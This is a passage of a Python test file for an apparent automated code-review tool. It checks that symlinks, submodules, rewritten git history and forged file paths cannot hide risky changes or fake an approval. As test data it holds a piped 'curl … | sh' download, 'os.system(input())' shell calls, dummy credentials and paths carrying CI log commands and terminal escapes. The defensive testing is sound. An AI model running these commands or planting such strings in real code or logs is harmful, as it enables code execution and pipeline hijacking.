class TestWhatNoLaneCouldRead:
    """A change of which no line reached the lanes, or only its start, is named and never approved. Measured before,
    each APPROVED, exit 0: a branch changing nothing, a binary file, and a file whose defect sat past the diff cap."""

    def test_a_branch_that_changes_nothing_is_no_change_to_review(self, hostile_repo: Path, cli, capsys) -> None:
        assert cli.main([str(hostile_repo), "--base", BASE, "--head", "empty"]) == 2
        err = capsys.readouterr().err
        assert "no change to review" in err and "Traceback" not in err, err

    @pytest.mark.parametrize(
        ("branch", "path", "why"), [("binary", "data.bin", "binary"), ("long", "pay.py", "cut at")]
    )
    def test_a_file_the_lanes_could_not_read_whole_is_named_and_degrades(
        self, branch: str, path: str, why: str, hostile_repo: Path, cli, capsys
    ) -> None:
        assert cli.main([str(hostile_repo), "--base", BASE, "--head", branch, "--scan", "*"]) == 3
        out = capsys.readouterr().out
        assert "## Verdict: DEGRADED" in out, out
        named = [line for line in out.splitlines() if line.startswith("- not read") and f"`{path}`" in line]
        assert named and why in named[0], out

    @pytest.mark.parametrize("made", ["binary", "submodule"])
    def test_a_file_a_type_change_makes_binary_or_a_submodule_is_named_unread(self, made: str, tmp_path: Path) -> None:
        """git prints a type change as the file it was and then the file it is, two headers, the binary file or the
        submodule named in the second. Measured by review: read by the first alone, a link made a binary file, and a
        file made a submodule, were named as no hole and approved."""
        from adk_review.collect.git import collect_evidence

        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        if made == "binary":  # a link at the base, written to the index alone: no system's symlinks needed
            _link_staged(repo, "vault", "README.md")
            _git_in(repo, "commit", "-qm", "a link")
        else:
            _committed(repo, "vault", "a file\n")
        _git_in(repo, "checkout", "-q", "-b", HEAD)
        _git_in(repo, "rm", "-q", "--cached", "vault")
        (repo / "vault").unlink(missing_ok=True)
        if made == "binary":
            _committed(repo, "vault", b"\x00\x01keystore\x00" * 64)
        else:
            commit = _git_in(repo, "rev-parse", "HEAD")
            _git_in(repo, "update-index", "--add", "--cacheinfo", f"160000,{commit},vault")
            _git_in(repo, "commit", "-qm", "a submodule")
        (vault,) = collect_evidence(str(repo), BASE, HEAD)["files"]
        assert vault["status"] == "T" and vault["unread"].startswith("binary" if made == "binary" else "a submodule")

    def test_a_submodule_under_a_name_the_skip_list_holds_is_never_skipped(self, tmp_path: Path) -> None:
        """The branch names a submodule as it likes, and no rule reads one. Measured by review: one named `logo.png`
        was skipped as an image and approved."""
        from adk_review.collect.git import collect_evidence

        repo = _branch_off_empty(tmp_path / "repo", HEAD)
        commit = _git_in(repo, "rev-parse", "HEAD")
        _git_in(repo, "update-index", "--add", "--cacheinfo", f"160000,{commit},assets/logo.png")
        _git_in(repo, "commit", "-qm", "a submodule")
        evidence = collect_evidence(str(repo), BASE, HEAD, skip=["*.png"])
        assert evidence["skipped"] == {}, evidence["skipped"]
        assert evidence["files"][0]["unread"].startswith("a submodule"), evidence["files"]


@pytest.fixture(params=["replace", "graft"])
def rewritten_repo(request, tmp_path: Path) -> Path:
    """A branch adding the key, in a repository whose history git reads rewritten: a replace ref swapping the key's
    file for a harmless one, or a graft making the key's commit an ancestor of `main`. Measured before: the first
    APPROVED, exit 0, the second reviewed no change at all."""
    repo = _branch_off_empty(tmp_path / "repo", HEAD)
    _committed(repo, "config.py", KEY_LINE, "the key")
    _git_in(repo, "checkout", "-q", BASE)
    _git_in(repo, "commit", "-q", "--allow-empty", "-m", "main moves on")
    if request.param == "replace":
        harmless = _git_in(repo, "hash-object", "-w", "--stdin", stdin="REGION = 'eu'\n")
        _git_in(repo, "replace", _git_in(repo, "rev-parse", f"{HEAD}:config.py"), harmless)
    else:
        main, parent, key = (_git_in(repo, "rev-parse", ref) for ref in (BASE, f"{BASE}~1", HEAD))
        (repo / ".git" / "info").mkdir(exist_ok=True)
        (repo / ".git" / "info" / "grafts").write_text(f"{main} {parent} {key}\n", encoding="utf-8")
    return repo


class TestWhereGitLooks:
    """git reads the repository named, and its history as committed. Measured before: `GIT_DIR` in the environment,
    as a shell or a hook can leave it, reviewed another repository under the requested path's name; a replace ref
    and a graft each rewrote what git read."""

    def test_history_rewritten_where_git_reads_it_hides_nothing(self, rewritten_repo: Path, cli, capsys) -> None:
        assert run_review(cli, rewritten_repo) == 1
        assert "hard-coded credential" in capsys.readouterr().out

    def test_a_git_dir_in_the_environment_points_nowhere_else(
        self, demo_repo: Path, tmp_path: Path, monkeypatch, cli, capsys
    ) -> None:
        from make_demo_repo import build, fix

        fixed = build(tmp_path / "fixed")
        fix(fixed)
        monkeypatch.setenv("GIT_DIR", str(fixed / ".git"))
        assert run_review(cli, demo_repo) == 1, "the planted branch, not the fixed one"
        assert "hard-coded credential" in capsys.readouterr().out


class TestWhatIsNotAChangeToRead:
    """Nothing a branch did not add is "not read". Measured after the guard above landed, each DEGRADED, exit 3,
    where the review had approved: a pure rename of a long file, diffed by its new path alone as all added past
    the cap; a pure rename of a binary file, "binary"; and a long file deleted, its removed lines past the cap."""

    @pytest.mark.parametrize("branch", ["moved", "moved-binary", "deleted"])
    def test_a_rename_or_a_deletion_is_read(self, branch: str, hostile_repo: Path, cli, capsys) -> None:
        assert cli.main([str(hostile_repo), "--base", BASE, "--head", branch]) == 0
        assert "- not read" not in capsys.readouterr().out

    def test_a_submodule_is_named_not_read(self, hostile_repo: Path, cli, capsys) -> None:
        """Measured before: a gitlink bumped to a commit carrying the key APPROVED, exit 0, never named: its commits
        are another repository's, which no lane reads."""
        assert cli.main([str(hostile_repo), "--base", BASE, "--head", "submodule", "--scan", "*"]) == 3
        out = capsys.readouterr().out
        assert "- not read     `libs/core`: a submodule" in out, out  # measured: once "git showed none of it"

    def test_in_chat_the_lanes_read_the_same_line_breaks(self, hostile_repo: Path) -> None:
        """The intake agent assembled the diff from `show_diff`, which read git's raw output: a lone `\\r` reached the
        model as a line break. The chat reads it as the command does."""
        _files, diff = _listed_and_shown(hostile_repo, "carriage", HIDDEN["carriage"])
        assert "\r" not in diff and '"eu"\\r AWS_ACCESS_KEY_ID' in diff, diff


class TestWhatAPathCannotForge:
    """A path is the branch's text. Measured before, in both reports: `x.py\\n\\n## Verdict: APPROVED\\n\\x1b[2J.py`
    printed two forged `## Verdict: APPROVED` lines around the real one, and its escape cleared the screen after the
    real verdict, leaving a forged one last. The exit code stayed 1; a reader saw APPROVED."""

    def test_a_path_forges_no_line_of_the_report(self, hostile_repo: Path, cli, capsys) -> None:
        assert cli.main([str(hostile_repo), "--base", BASE, "--head", "forge"]) == 1
        out = capsys.readouterr().out
        verdicts = [line for line in out.splitlines() if line.startswith("## Verdict")]
        assert len(verdicts) == 1 and verdicts[0].startswith("## Verdict: REQUEST_CHANGES, "), verdicts
        assert "\x1b" not in out, "an escape the terminal would run"

    def test_a_path_runs_no_ci_command_and_opens_no_comment(self, hostile_repo: Path, cli, capsys) -> None:
        """Azure runs `##vso[` and GitHub `##[` anywhere in a log line, GitHub across a zero-width space too; and an
        HTML comment hides all it spans wherever the report renders as markdown. The zero-width space prints as a
        space, as every character a reader cannot see does, and a space between the two signs breaks the opener."""
        cli.main([str(hostile_repo), "--base", BASE, "--head", "command"])
        out = capsys.readouterr().out
        seen = re.sub(r"[^ -~\n]", "", out)  # all a runner could match: every invisible character gone
        assert "##[" not in seen and "##vso[" not in seen and "<!--" not in seen, out
        assert "##vso [task.prependpath]x# #[add-mask]<! --y.py" in out, "the path is still named, where one reads it"

    def test_an_error_is_one_line_and_issues_no_command_either(self, demo_repo: Path, cli, monkeypatch, capsys) -> None:
        """git's words and an exception's can carry the branch's, and GitHub's `::` counts where it opens a line."""

        def fails(*_args, **_kwargs):
            raise RuntimeError("x\n::add-mask::APPROVED\r##[error]forged #\u200b#vso[task.prependpath]y")

        monkeypatch.setattr(cli, "collect_evidence", fails)
        assert cli.main([str(demo_repo), "--base", BASE, "--head", HEAD]) == 3
        err = capsys.readouterr().err
        lines = [re.sub(r"[^ -~]", "", line) for line in re.split(r"\r\n?|\n", err) if line]
        assert lines == [
            "review: the review did not finish: RuntimeError: x ::add-mask::APPROVED ## [error]forged "
            "# #vso[task.prependpath]y"
        ], err


class TestWhatALinkPointsAt:
    """A symbolic link runs as the file it names: the rules read that file under the link's name, and the guidelines,
    who see only the path it names, name the link unread."""

    def test_a_link_is_read_as_the_file_it_names_and_named_unread_for_the_guidelines(self, tmp_path: Path) -> None:
        """Measured by review: `run.py`, a link to `assets/logo.png` holding Python, was linted by no rule, since a
        link had no text, and shown to no guideline, since the skip list leaves images out: approved, the shell call
        unread. The link's text is its target's now, and the guidelines, shown only the path it names, name it."""
        from adk_review.judge.checks import run_rules
        from adk_review.judge.rules.lint import Lint

        repo = _link_on_branch(tmp_path, "assets/logo.png", "import os\nos.system(input())\n")
        evidence = importlib.import_module("adk_review.collect.git").collect_evidence(
            str(repo), BASE, HEAD, skip=["*.png"]
        )
        (link,) = [f for f in evidence["files"] if f["path"] == "run.py"]
        assert link["text"] == "import os\nos.system(input())\n", "the file the link names, read under its name"
        # And every line of it is added, for the report too: read by review, the JSON said the shell call stood on a
        # line the change did not add, which a pipeline reading added lines alone would pass over.
        assert link["added_at"] == {1, 2}, link["added_at"]
        assert "symbolic link" in link["unread"], link["unread"]
        found = run_rules(evidence, [Lint()])["rule.lint"].findings
        # Every line of it is new under the link's name: listed where it stands, never counted as one the change kept.
        assert [(f.file, f.line) for f in found if "S605" in f.title] == [("run.py", 2)], [
            (f.title, f.line) for f in found
        ]

    def test_a_link_to_no_file_of_the_head_gives_the_rules_nothing_and_the_guidelines_a_hole(
        self, tmp_path: Path
    ) -> None:
        """A link out of the repository, or to a folder, has no text here: no rule's hole, as no rule can run it,
        where a rule reading a name with no extension would ask; the guidelines, shown no file there, name it."""
        repo = _link_on_branch(tmp_path, "../../etc/passwd", None)
        link = gathered(repo, HEAD)["run.py"]
        assert (link["text"], link["unread_text"]) == (None, None)
        assert "symbolic link" in link["unread"], link["unread"]

    def test_a_link_to_a_binary_file_gives_the_rules_no_text(self, tmp_path: Path) -> None:
        """Git calls a file holding a NUL in its first 8,000 bytes binary, and a link to one reads as one: never as
        text the rules would lint, replacement characters and all."""
        repo = _link_on_branch(tmp_path, "assets/logo.png", "\x89PNG\x00\x01\x02\n")
        link = gathered(repo, HEAD)["run.py"]
        assert (link["text"], link["unread_text"]) == (None, None)

    def test_a_link_to_a_file_the_guidelines_read_whole_is_no_hole(self, tmp_path: Path) -> None:
        """A change adding a script and a link to it shows the guidelines the script whole: they read the link's
        text, under the script's name. A rules-only review names no link at all: the rules read the file it names."""
        repo = _link_on_branch(tmp_path, "bin/tool.py", None, adding=("bin/tool.py", "print('tool')\n"))
        assert gathered(repo, HEAD)["run.py"]["unread"] == ""
        skipped = _link_on_branch(tmp_path / "rules-only", "assets/logo.png", "import os\n")
        assert gathered(skipped, HEAD, guidelines=False)["run.py"]["unread"] == ""

    def test_a_workflow_linked_into_place_is_read_whole_there(self, tmp_path: Path) -> None:
        """As a workflow moved into `.github/workflows/` is, a link there to one kept elsewhere runs every line of it:
        read by review, the link added one line, the path it names, and the tag it ran went unread."""
        from adk_review.judge.checks import run_rules
        from adk_review.judge.rules.pinned_actions import PinnedActions

        workflow = "on: push\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n"
        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        _committed(repo, "docs/example.yml", workflow, "an example")
        _git_in(repo, "checkout", "-q", "-b", "change")
        _link_staged(repo, ".github/workflows/ci.yml", "../../docs/example.yml")
        _git_in(repo, "commit", "-qm", "a link")
        evidence = importlib.import_module("adk_review.collect.git").collect_evidence(str(repo), BASE, "change")
        found = run_rules(evidence, [PinnedActions()])["rule.pinned-actions"].findings
        assert [(f.file, f.line) for f in found] == [(".github/workflows/ci.yml", 5)], found

    def test_a_link_to_a_file_the_change_only_modifies_is_a_hole(self, tmp_path: Path) -> None:
        """Read by review: a file the change modifies counted as shown whole, though the guidelines saw one hunk of it,
        so a link to a file whose shell call the change did not touch was no hole, the call read by no guideline. Only
        a file the change adds is shown whole."""
        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        body = "import os\nos.system(input())\n" + "".join(f"x{n} = {n}\n" for n in range(30))
        _committed(repo, "docs/example.txt", body, "base")
        _git_in(repo, "checkout", "-q", "-b", "change")
        _committed(repo, "docs/example.txt", body.replace("x20 = 20", "x20 = 21"), "an edit far from the call")
        _link_staged(repo, "run.py", "docs/example.txt")
        _git_in(repo, "commit", "-qm", "a link")
        assert "symbolic link" in gathered(repo, "change")["run.py"]["unread"]

    def test_a_link_moved_whole_is_known_by_its_mode(self, tmp_path: Path) -> None:
        """Read by review: a link was known by the mode its diff printed, and a link moved whole prints none, only
        `similarity index 100%`, so `scripts/run.py`, moved to name a helper holding a shell call, was no hole and the
        call read by no one. A link is known by its mode at the head, and read through as any other."""
        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        _committed(repo, "scripts/helper.txt", "import os\nos.system(input())\n", "a helper")
        _link_staged(repo, "tools/run.py", "helper.txt")
        _git_in(repo, "commit", "-qm", "a link")
        _git_in(repo, "checkout", "-q", "-b", "change")
        _git_in(repo, "update-index", "--force-remove", "tools/run.py")
        _link_staged(repo, "scripts/run.py", "helper.txt")  # the same text, so the same blob: moved whole
        _git_in(repo, "commit", "-qm", "the link moved")
        moved = gathered(repo, "change")["scripts/run.py"]
        assert moved["status"] == "R" and "symbolic link" in moved["unread"], (moved["status"], moved["unread"])
        assert moved["text"] == "import os\nos.system(input())\n", "the rules read the file it names now"

    def test_the_rules_follow_a_link_through_a_link(self, tmp_path: Path) -> None:
        """Read by review: the rules read one link through, so `run.py`, a link to a link to an image holding Python,
        was read by no rule, under the pre-push hook's profile approved with no hole. Links are followed as a system
        follows them, forty deep."""
        from adk_review.judge.checks import run_rules
        from adk_review.judge.rules.lint import Lint

        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        _committed(repo, "assets/logo.png", "import os\nos.system(input())\n", "an image")
        _link_staged(repo, "mid", "assets/logo.png")
        _git_in(repo, "commit", "-qm", "a link")
        _git_in(repo, "checkout", "-q", "-b", "change")
        _link_staged(repo, "run.py", "mid")
        _git_in(repo, "commit", "-qm", "a link to the link")
        evidence = importlib.import_module("adk_review.collect.git").collect_evidence(
            str(repo), BASE, "change", guidelines=False
        )
        found = run_rules(evidence, [Lint()])["rule.lint"].findings
        assert [(f.file, f.line) for f in found if "S605" in f.title] == [("run.py", 2)], [f.title for f in found]

    @staticmethod
    def _staged(repo: Path, links: dict[str, str], scratch: Path) -> None:
        """Each `path: target` of `links` staged as a link at once, through git's plumbing: one process to hash them
        and one to stage them, however many."""
        scratch.mkdir(parents=True, exist_ok=True)
        texts = []
        for at, target in enumerate(links.values()):
            (scratch / str(at)).write_bytes(target.encode())
            texts.append(str(scratch / str(at)))
        shas = _git_in(repo, "hash-object", "-w", "--stdin-paths", stdin="\n".join(texts) + "\n").split()
        entries = "".join(f"120000 {sha}\t{path}\n" for sha, path in zip(shas, links, strict=True))
        _git_in(repo, "update-index", "--index-info", stdin=entries)

    def test_the_rules_follow_a_link_through_a_folder_a_link_names(self, tmp_path: Path) -> None:
        """Read by review: a link's path was looked up whole, never a part at a time, so `run.py` naming
        `img/logo.png`, where `img` is a link to `assets`, named no file the head lists, and the Python in
        `assets/logo.png` was read by no rule, approved under the pre-push hook's profile. A link is followed as a
        system follows it, each part in turn."""
        from adk_review.judge.checks import run_rules
        from adk_review.judge.rules.lint import Lint

        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        _committed(repo, "README.md", "# readme\n", "base")
        _git_in(repo, "checkout", "-q", "-b", "change")
        _committed(repo, "assets/logo.png", "import os\nos.system(input())\n", "a logo")
        self._staged(repo, {"img": "assets", "run.py": "img/logo.png"}, tmp_path / "links")
        _git_in(repo, "commit", "-qm", "a folder link and a script")
        evidence = importlib.import_module("adk_review.collect.git").collect_evidence(
            str(repo), BASE, "change", guidelines=False
        )
        found = run_rules(evidence, [Lint()])["rule.lint"].findings
        assert [(f.file, f.line) for f in found if "S605" in f.title] == [("run.py", 2)], [f.title for f in found]

    def test_a_parent_after_a_folder_link_climbs_from_where_the_link_led(self, tmp_path: Path) -> None:
        """Read by review: a link's path was made plain as text before any link on it was followed, so `run.py`
        naming `lib/../notes.txt`, where `lib` is a link to `assets/pkg`, read as the harmless `notes.txt` the change
        added, shown to the guidelines whole, where a system runs `assets/notes.txt` and its shell call: approved. A
        `..` climbs from where the link before it led."""
        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        _committed(repo, "assets/pkg/readme.txt", "a package\n", "a package")
        _committed(repo, "assets/notes.txt", "import os\nos.system(input())\n", "notes")
        self._staged(repo, {"lib": "assets/pkg"}, tmp_path / "base")
        _git_in(repo, "commit", "-qm", "a folder link")
        _git_in(repo, "checkout", "-q", "-b", "change")
        note = _git_in(repo, "hash-object", "-w", "--stdin", stdin="x = 1\n")
        _git_in(repo, "update-index", "--add", "--cacheinfo", f"100644,{note},notes.txt")
        self._staged(repo, {"run.py": "lib/../notes.txt"}, tmp_path / "change")
        _git_in(repo, "commit", "-qm", "a note and a link")
        link = gathered(repo, "change")["run.py"]
        assert (link.get("target"), link["text"]) == ("assets/notes.txt", "import os\nos.system(input())\n"), link
        assert "symbolic link" in link["unread"], "the guidelines were shown `notes.txt`, not the file it runs"

    def test_a_link_is_followed_through_forty_links_as_linux_follows_them(self, tmp_path: Path) -> None:
        """Read by review: forty steps followed thirty-nine links, where Linux follows forty and refuses the
        forty-first, so `run.py` heading a chain of forty, the last naming an image holding Python, was read by no
        rule. Forty are followed, and past them a link names nothing, as a system says."""

        def chain(links: int) -> dict:
            repo = tmp_path / f"chain{links}"
            repo.mkdir()
            _git_in(repo, "init", "-q", "-b", BASE)
            _committed(repo, "README.md", "# readme\n", "base")
            _git_in(repo, "checkout", "-q", "-b", "change")
            _committed(repo, "assets/logo.png", "import os\nos.system(input())\n", "an image")
            names = ["run.py", *(f"l{n}" for n in range(1, links))]
            self._staged(repo, dict(zip(names, [*names[1:], "assets/logo.png"], strict=True)), tmp_path / str(links))
            _git_in(repo, "commit", "-qm", "a chain")
            return gathered(repo, "change", guidelines=False)["run.py"]

        assert chain(40)["text"] == "import os\nos.system(input())\n"
        past = chain(41)
        assert (past["text"], past["unread_text"]) == (None, None), "a loop, as a system says"

    @pytest.mark.parametrize(
        ("named", "runs"),
        [
            ("assets/logo.png", "assets/logo.png"),
            ("./assets//logo.png", "assets/logo.png"),  # `.` and an empty part stand where they are
            ("img/logo.png", "assets/logo.png"),  # through a link to a folder
            ("lib/../logo.png", "assets/logo.png"),  # `..` climbs from where `lib` led, `assets/pkg`
            ("assets", None),  # a folder runs as no file
            ("assets/logo.png/", None),  # nor a file read as a folder
            ("assets/logo.png/../logo.png", None),
            ("vendor", None),  # a submodule is a folder
            ("vendor/../assets/logo.png", "assets/logo.png"),
            ("vendor/tool.png", "unfollowed"),  # and what it holds another repository's
            ("../proj/assets/logo.png", "assets/logo.png"),  # back in through a checkout named `proj`
            ("../../work/proj/assets/logo.png", "assets/logo.png"),
            (
                "../../app/assets/logo.png",
                "assets/logo.png",
            ),  # a copy at `/app`, the top of the file system its own `..`
            ("../outside.py", None),  # a checkout's own folder, at most
            ("/app/assets/logo.png", "assets/logo.png"),  # a copy deployed at `/app`
            ("/../../app/assets/logo.png", "assets/logo.png"),
            ("d/app/assets/logo.png", "assets/logo.png"),  # `d` a link to `/srv`, the copy at `/srv/app`
            ("root/app/assets/logo.png", "assets/logo.png"),  # `root` a link to `/`
            ("/etc/passwd", None),
            ("/opt/tools/run.sh", "unfollowed"),  # `tools/run.sh` or `run.sh`, as where the copy lies decides
            ("Assets/Logo.png", "assets/logo.png"),  # as a file system blind to case finds it
            ("cafe\u0301.png", "caf\u00e9.png"),  # and one blind to Unicode's forms
            ("ASSETS", None),  # a folder there too
            ("DOCS/a.md", "unfollowed"),  # `Docs` and `docs`, which such a system holds as one
            ("C:logo.png", "C:logo.png"),  # a name, as git stores a link and a POSIX system reads one
            ("\\logo.png", "\\logo.png"),
            ("C:/Windows/x.py", None),
            ("loop", None),  # a link to itself: past forty, as a system reads it
            ("unread/x.py", "unfollowed"),  # a link on the way that was not read
        ],
    )
    def test_a_link_runs_as_the_file_a_system_finds_there(self, named: str, runs: str | None) -> None:
        """Each part of the path in turn, as a system follows it: a link on the way, a `..` after one, and a file, a
        folder or a submodule at the end. Read by review: a path out of the repository, which a checkout's own folder
        or a deployed copy leads back into, one only a file system blind to case finds, and one into a submodule each
        named no file, and the pre-push hook's profile approved what each runs; then the top of the file system was
        read as having folders over it, and a link to `/srv` was tried only as deep as its own text, so a copy at
        `/app` and one at `/srv/app` were missed; and a near-miss of case was a hole even where it named a folder,
        stopping a push that added a link to a sibling checkout's `Assets`."""
        from adk_review.core.paths import Links, UnfollowedError

        files = {"assets/logo.png", "assets/pkg/readme.txt", "tools/run.sh", "run.sh", "C:logo.png", "\\logo.png"}
        head = Links(
            {*files, "caf\u00e9.png", "Docs/a.md", "docs/b.md"},
            {"img": "assets", "lib": "assets/pkg", "loop": "loop", "unread": None, "d": "/srv", "root": "/"}
            | {"run.py": named},
            ["vendor"],
        )
        try:
            found: str | None = head.follow("run.py")
        except UnfollowedError:
            found = "unfollowed"
        assert found == runs

    def test_ordinary_links_in_their_thousands_are_all_followed(self) -> None:
        """Read by review: each depth an absolute path's copy could lie at was charged a copy of the whole path, so
        5,000 links such as an OS image's `/usr/lib/jvm/…/bin/tool` spent the review's steps and 1,611 of them were
        holes, and 52,000 relative links of an icon theme under `--all` spent them too. Ordinary links cost their
        parts."""
        from adk_review.core.paths import Links

        jvm = {f"etc/alternatives/tool{n}": f"/usr/lib/jvm/java-17-openjdk-amd64/bin/tool{n}" for n in range(5_000)}
        head = Links({"README.md"}, jvm)
        assert [head.follow(link) for link in jvm] == [None] * len(jvm)
        icons = {f"icons/{n}.png": f"../src/icon{n}.png" for n in range(52_000)}
        theme = Links({f"src/icon{n}.png" for n in range(52_000)}, icons)
        assert all(theme.follow(link) == f"src/icon{n}.png" for n, link in enumerate(icons))

    @staticmethod
    def _random_tree(rng: random.Random, top: Path) -> tuple[set[str], dict[str, str]]:
        """A tree of real files and links at `top`, its files and each link's path with the path it names: half of
        them a route to something the tree holds, through detours a system walks its own way, out over the top and
        back in through the checkout's own folder, `work`; the rest random parts. No empty folder, as git holds none."""
        folders = rng.sample(["a", "b", "a/b", "a/c", "c"], k=rng.randint(1, 4))
        files = {f"{rng.choice(['', *folders])}/{name}".lstrip("/") for name in rng.sample(["f.py", "g"], 2)}
        links: dict[str, str] = {}
        for at in range(rng.randint(2, 8)):
            folder = rng.choice(["", *folders])
            if rng.random() < 0.5:
                parts = [".."] * (folder.count("/") + 1 if folder else 0) + rng.choice([[], [], ["..", "work"]])
                for part in rng.choice([*files, *folders, *links, "a/f.py"]).split("/"):
                    if rng.random() < 0.3:  # into a folder or a link to one and back out, which may land elsewhere
                        parts += [rng.choice(["a", "b", "c", *links]).rpartition("/")[2], ".."]
                    parts += [part] if rng.random() < 0.8 else [".", part]
            else:
                parts = rng.choices(["a", "b", "c", "f.py", "g", "..", ".", "work", "l0", "l1"], k=rng.randint(1, 5))
            links[f"{folder}/l{at}".lstrip("/")] = "/".join(parts) + rng.choice(["", "", "", "/"])
        for path in [*files, *links]:
            (top / path).parent.mkdir(parents=True, exist_ok=True)
        for path in files:
            (top / path).write_text("x\n", encoding="utf-8")
        for path, named in links.items():
            os.symlink(named, top / path)
        return files, links

    @pytest.mark.skipif(os.name == "nt", reason="a link needs a privilege on Windows")
    def test_a_link_runs_as_the_file_system_runs_it_over_random_trees(self, tmp_path: Path) -> None:
        """Random trees of real files and links, each link asked of the file system and of `Links.follow`: where the
        system's walk stays in the repository, or comes back in through the checkout's own folder, they name the same
        file, or none. Four reviews each found a path on which they did not; the walk before the third answered none
        where a system came back in."""
        from adk_review.core.paths import Links, UnfollowedError

        rng, asked = random.Random(3), 0
        for trial in range(300):
            top = tmp_path / str(trial) / "work"  # the checkout's own folder, which a link may climb back in through
            files, links = self._random_tree(rng, top)
            real_top, head = os.path.realpath(top), Links(files, links)
            for path in links:
                real = os.path.realpath(top / path)
                if os.path.commonpath([real, real_top]) != real_top:
                    continue  # out of the repository and not back in: what it runs is no file of it
                runs = os.path.relpath(real, real_top).replace(os.sep, "/") if os.path.isfile(top / path) else None
                try:
                    found: str | None = head.follow(path)
                except UnfollowedError as hole:
                    found = f"a hole: {hole}"
                assert found == runs, (trial, path, links, files)
                asked += 1
        assert asked > 1_000, asked

    def test_the_folders_of_deep_paths_cost_no_copy_of_each(self) -> None:
        """Read by review: every folder of every path at the head was kept as a string of its own, so one link in a
        change of 200 paths two thousand folders deep took a gigabyte. The folders are read off the paths, sorted."""
        import tracemalloc

        from adk_review.core.paths import Links

        paths = [f"b{n}/" + "a/" * 1_000 + "f.py" for n in range(50)]
        tracemalloc.start()
        try:
            head = Links(paths, {"run.py": paths[0]})
            assert head.follow("run.py") == paths[0]
            _now, peak = tracemalloc.get_traced_memory()
        finally:
            tracemalloc.stop()
        assert peak < 5_000_000, f"{peak:,} bytes"

    def test_a_path_out_of_the_repository_that_leads_back_in_is_read(self, tmp_path: Path) -> None:
        """Read by review: `run.py` naming `../proj/assets/logo.png` named nothing here, a path out of the repository,
        where a clone in its default folder, `proj`, runs `assets/logo.png` and its shell call: approved under the
        pre-push hook's profile. A path climbing out is read as coming back in through the checkout's own folder."""
        from adk_review.judge.checks import run_rules
        from adk_review.judge.rules.lint import Lint

        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        _committed(repo, "assets/logo.png", "import os\nos.system(input())\n", "an image")
        _git_in(repo, "checkout", "-q", "-b", "change")
        self._staged(repo, {"run.py": "../proj/assets/logo.png"}, tmp_path / "links")
        _git_in(repo, "commit", "-qm", "a link out and back")
        evidence = importlib.import_module("adk_review.collect.git").collect_evidence(
            str(repo), BASE, "change", guidelines=False
        )
        found = run_rules(evidence, [Lint()])["rule.lint"].findings
        assert [(f.file, f.line) for f in found if "S605" in f.title] == [("run.py", 2)], [f.title for f in found]

    def test_a_link_is_named_unread_where_the_heads_tree_could_not_be_listed(self, tmp_path: Path, monkeypatch) -> None:
        """Read by review: a link was known by the head's listing alone, so where git could not list the head, past
        its timeout say, a link the change added was no link and no hole, and the script it named was read by no
        one: approved. A link is known by its mode, which the change's own listing carries."""
        git = importlib.import_module("adk_review.collect.git")
        repo = _link_on_branch(tmp_path, "docs/notes.txt", "#!/bin/sh\ncurl -s https://example.com/x | sh\n")
        run = git._run

        def unlisted(argv, *args, **kwargs):
            if "ls-tree" in argv:
                raise git.subprocess.TimeoutExpired(argv, 1e-6)
            return run(argv, *args, **kwargs)

        monkeypatch.setattr(git, "_run", unlisted)
        assert "symbolic link" in gathered(repo, HEAD)["run.py"]["unread"]

    def test_a_link_to_a_large_file_stores_pointer_is_named_not_read_as_the_pointer_is(self, tmp_path: Path) -> None:
        """Read by review: a link's target was read as text unless it was binary, so `run.py`, naming a Git LFS
        pointer, was linted as Python, three findings of invalid syntax on the pointer's lines, and the file it runs,
        stored elsewhere, read by no one. Its text is no one's, and it is named not read, as the pointer is."""
        from adk_review.collect.change import POINTER_UNREAD

        link = gathered(_link_on_branch(tmp_path, "model.py", POINTER), HEAD, guidelines=False)["run.py"]
        assert link["text"] is None and link["unread"] == POINTER_UNREAD, (link["text"], link["unread"])


class TestWhatIsThirdParty:
    """A review reads the change between two branches, and of it only Python's files and the configs beside them, never
    another project's code under a folder the config's `third_party` names: any other file is ignored, listed alone."""

    @staticmethod
    def _shipped() -> dict:
        from adk_review.judge.catalog import CONFIG, load_config

        review = load_config(CONFIG)["review"]
        return {"scan": review["scan"], "third_party": review["third_party"]}

    def test_only_pythons_files_and_configs_are_read(self, tmp_path: Path) -> None:
        """Asked by the owner: the diff of two local branches, its Python files and configs alone, every third-party
        library, vendored module and environment ignored whole. A change adding each kind reviews the project's own
        Python and config files, and lists the rest."""
        from adk_review.judge.checks import run_rules
        from adk_review.judge.rules.lint import Lint

        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        _committed(repo, "app.py", "x = 1\n", "base")
        _git_in(repo, "checkout", "-q", "-b", "change")
        shell = "import os\nos.system(input())\n"
        for path in ("vendor/lib/run.py", "src/vendor/six.py", ".venv/lib/site.py", "node_modules/pkg/index.js"):
            _committed(repo, path, shell)
        for path in ("README.md", "web/app.js", "deploy.sh"):
            _committed(repo, path, "TOKEN = 'ghp_" + "a1B2" * 9 + "'\n")
        _committed(repo, "app.py", "x = 2\n")
        _committed(repo, "pyproject.toml", '[project]\nname = "x"\n')
        git = importlib.import_module("adk_review.collect.git")
        evidence = git.collect_evidence(str(repo), BASE, "change", **self._shipped())
        assert [f["path"] for f in evidence["files"]] == ["app.py", "pyproject.toml"]
        assert evidence["ignored"] == [".venv/lib/site.py", "README.md", "deploy.sh", "node_modules/pkg/index.js",
                                       "src/vendor/six.py", "vendor/lib/run.py", "web/app.js"]  # fmt: skip
        assert "vendor" not in evidence["diff"] and "ghp_" not in evidence["diff"], "no guideline is shown one"
        assert run_rules(evidence, [Lint()])["rule.lint"].findings == [], "nor does any rule read one"

    def test_a_script_with_no_suffix_and_a_notebook_are_read(self, tmp_path: Path) -> None:
        """Read by review: `scan` names Python's files by suffix, and a script with none, which only its first line
